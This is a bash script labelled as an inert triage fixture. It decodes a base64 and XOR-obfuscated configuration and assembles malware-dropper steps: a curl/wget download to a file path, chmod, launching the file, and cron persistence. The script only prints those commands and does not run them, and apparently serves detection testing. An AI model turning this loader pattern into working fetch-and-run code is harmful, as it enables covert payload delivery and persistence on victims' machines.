# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_470f4dba='rebqp6ivvquo5quptL2yt76Es7Sor/e6uKqusqm+hKm+trSvvvesqbKvvoS9sre+97izurW8voS2tL++97+yqKu6r7izhKuptLi+qKinur+6q6++qeasvL6vhLqpuLOEvbq3t7m6uLCnqK+6vL6EuLSuta/m7qe4urarurK8tYSyv+a4urarurK8tfa54uzp7eO56O+/p66pt+azr6+rqOH09Lni7Ont47no77/1vqO6tqu3vvWyta26t7K/9Onp6u+47uLu9aizp66ovqmEury+ta/mk661r6m+qKiXurn0ueLs6e3juejvv6e9sre+hKu6r7Pm9K+2q/SzrrWvqb6oqPa4urizvvT1qK+6vL72ueLs6e3juejvv6e6qbizhKuptLm+5q61ura+9ranqL6prbK4voS1ura+5q6rv7qvvva54uzp7eO56O+/9ai+qa2yuL6nuKm0tYSruq+z5vS+r7j0uKm0tfW/9K6rv7qvvva54uzp7eO56O+/'
readonly Codec_470f4dba='base64_literal|single_byte_xor|db'

Load_470f4dba() {
  stored_bytes=()
  local encoded_part
  while read -r encoded_part; do [[ -n "$encoded_part" ]] && stored_bytes+=("$encoded_part"); done < <(printf '%s' "${Material_470f4dba}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
}

Decode_470f4dba() {
  recovered_bytes=()
  local byte_index
  for ((byte_index=0; byte_index<${#stored_bytes[@]}; byte_index++)); do
    recovered_bytes+=("$((stored_bytes[byte_index] ^ 219))")
  done
}

Recover_470f4dba() {
  local -a stored_bytes recovered_bytes
  local configuration_text harmless_value decode_pass byte_index
  local -a compass=(north south); harmless_value="$(IFS=:; printf '%s' "${compass[*]}")"
  Load_470f4dba
  for decode_pass in 1; do Decode_470f4dba; done
  configuration_text=''
  local octal character
  for byte_index in "${!recovered_bytes[@]}"; do
    printf -v octal '%03o' "${recovered_bytes[byte_index]}"
    printf -v character '%b' "\\$octal"
    configuration_text+="$character"
  done
  printf '%s\n' "$configuration_text"
}

Inspect_470f4dba() { Recover_470f4dba; }

Plan_470f4dba() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_470f4dba)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
  declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_470f4dba; fi

# reconstruction complete